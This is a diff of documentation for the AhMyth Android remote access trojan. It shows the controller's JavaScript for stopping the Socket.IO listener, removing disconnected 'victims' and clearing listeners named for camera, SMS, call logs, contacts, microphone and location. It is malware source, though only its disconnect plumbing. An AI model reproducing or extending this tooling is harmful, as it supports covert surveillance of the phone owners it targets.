@@ -96,126 +96,86 @@ manifest replacement function | AppCtrl.js = Line 2849 --> 2860 |
     }
 ```
     
-Stop function for the AhMyth Listener | AppCtrl.js = Line 133 --> 165 |
+Stop function for the AhMyth Listener | AppCtrl.js = Line 51 --> 77 |
 ```javascript
-    // when user clicks Stop button
+    // when user clicks Disconnect Button
     $appCtrl.Stop = (port) => {
       if (!port) {
-          port = CONSTANTS.defaultPort;
+        port = CONSTANTS.defaultPort;
       }
+      
+      //notify the main process to disconnect the port
+      ipcRenderer.send('SocketIO:StopListen', port);
+      $appCtrl.Log("Stopped Listening on Port: " + port, CONSTANTS.logStatus.SUCCESS);
+    }
 
-      // notify the main proccess about the port and let him stop listening
-      ipcRenderer.send("SocketIO:Stop", port);
-      $appCtrl.Log("Stopped Listening on port => " + port, CONSTANTS.logStatus.SUCCESS);
-  }
-
-
-  // fired if listening brings error
-  ipcRenderer.on("SocketIO:Stop", (event, error) => {
-      $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
-          $appCtrl.isListen = false;
-          $appCtrl.$apply()
-  });
-
-
-  // fired when main proccess (main.js) send any new notification about disconnected victim
-  ipcRenderer.on('SocketIO:RemoveVictim', (event, index) => {
-      $appCtrl.Log("Server disconnected " + viclist[index].ip);
-      // delete him from list
+    //fired when main process sends any notification about the ServerDisconnect 
+    ipcRenderer.on('SocketIO:ServerDisconnect', (event, index) => {
       delete viclist[index];
       $appCtrl.$apply();
+    });
+
+    // fired if stopping the listener brings error
+    ipcRenderer.on("SocketIO:StopListen", (event, error) => {
+      $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
+      $appCtrl.$apply()
   });
 
-
-  // notify the main proccess (main.js) to close the lab
-  $appCtrl.closeLab = (index) => {
-      ipcRenderer.send('closeLabWindow', 'lab.html', index);
+    //notify the main process to close the lab
+    $appCtrl.closeLab = (index) => {
+      ipcRenderer.send('closeLabWindow', 'lab.html', index)
     }
 ```
   
-Stop function for the AhMyth Listener | Main.js = Line 262 --> Line 333 |
+Stop function for the AhMyth Listener | Main.js = Line 131 --> 166 + Line 244 --> Line 253 |
 ```javascript 
-  // fired when stopped listening
-  // It will be fired when AppCtrl emit this event
-  ipcMain.on('SocketIO:Stop', function (event, port) {
+// fired when stopped listening for victim
+ipcMain.on("SocketIO:StopListen", function (event, port) {
 
-  // stop listening
-  IO = IO.close(port);
-  IO.sockets.pingInterval = 10000;
+  IO.close();
   IO.sockets.on('connection', function (socket) {
-
+    // decrease socket count on Disconnect
     socket.on('disconnect', function () {
-      // Decrease the socket count on a disconnect
-      victimsList.rmVictim(index);
+      victimList.rmVictim(index)
 
-      //notify renderer proccess (AppCtrl) about the disconnected Victim
-      win.webContents.send('SocketIO:RemoveVictim', index);
+      // notify the renderer process about the Server Disconnection
+      win.webContents.send('SocketIO:ServerDisconnect', index);
 
       if (windows[index]) {
-        //notify renderer proccess (LabCtrl) if opened about the server disconnection
-        BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:ServerDisconnected");
-        //delete the window from windowsList
-        delete windows[index]
+        // notify the renderer process about the Disconnected Server
+        windows[index].webContents.send('SocketIO:ServerDisconnected', index);
+        // delete the windows from the windowList
+        delete windows[index];
       }
     });
-
   });
-
 });
 
+
+ipcMain.on("closeLabWindow", function (event, index) {
+  delete windows[index];
+  //on lab window closed remove all socket listners
+  if (victimsList.getVictim(index).socket) {
+    victimsList.getVictim(index).socket.removeAllListeners("x0000ca"); // camera
+    victimsList.getVictim(index).socket.removeAllListeners("x0000fm"); // file manager
+    victimsList.getVictim(index).socket.removeAllListeners("x0000sm"); // sms
+    victimsList.getVictim(index).socket.removeAllListeners("x0000cl"); // call logs
+    victimsList.getVictim(index).socket.removeAllListeners("x0000cn"); // contacts
+    victimsList.getVictim(index).socket.removeAllListeners("x0000mc"); // mic
+    victimsList.getVictim(index).socket.removeAllListeners("x0000lm"); // location
+  }
+});
 
 //handle the Uncaught Exceptions
+process.on('uncaughtException', function (error) {
 
+  if (error.code == "EADDRINUSE" || error.code == "ENOTCONN") {
+    win.webContents.send('SocketIO:Listen', "Address Already in Use");
+  } else {
+    win.webContents.send('SocketIO:StopListen', "Server is not Listening");
+  } // end of if
 
-
-
-// Fired when Victim's Lab is closed
-ipcMain.on('closeLabWindow', function (e, page, index) {
-  //------------------------Lab SCREEN INIT------------------------------------
-  // create the Lab window
-  let child = new BrowserWindow({
-    icon: __dirname + '/app/assets/img/icon.png',
-    parent: win,
-    width: 700,
-    height: 750,
-    show: false,
-    darkTheme: true,
-    transparent: true,
-    resizable: false,
-    frame: false,
-    webPreferences: {
-      nodeIntegration: true,
-      enableRemoteModule: true
-    }
-  })
-
-  child.once('ready-to-show', () => {
-    child.show();
-  });
-
-  child.on('closed', () => {
-    delete windows[index];
-    //on lab window closed remove all socket listners
-    if (victimsList.getVictim(index).socket) {
-      victimsList.getVictim(index).socket.removeAllListeners("x0000ca"); // camera
-      victimsList.getVictim(index).socket.removeAllListeners("x0000fm"); // file manager
-      victimsList.getVictim(index).socket.removeAllListeners("x0000sm"); // sms
-      victimsList.getVictim(index).socket.removeAllListeners("x0000cl"); // call logs
-      victimsList.getVictim(index).socket.removeAllListeners("x0000cn"); // contacts
-      victimsList.getVictim(index).socket.removeAllListeners("x0000mc"); // mic
-      victimsList.getVictim(index).socket.removeAllListeners("x0000lm"); // location
-    }
-  })
 });
-```
-
-Stop function for the AhMyth Listener | LabCtrl.js = Line 86 --> 90 |
-```javascript
-    //fired when notified from Main Proccess (main.js) about
-    // the server who disconnected
-    ipcRenderer.on('SocketIO:ServerDisconnected', (event) => {
-        $rootScope.Log('Server Disconnected', CONSTANTS.logStatus.SUCCESS);
-    });
 ```
 
 Stop function for the AhMyth Listener | index.html = Line 69 |
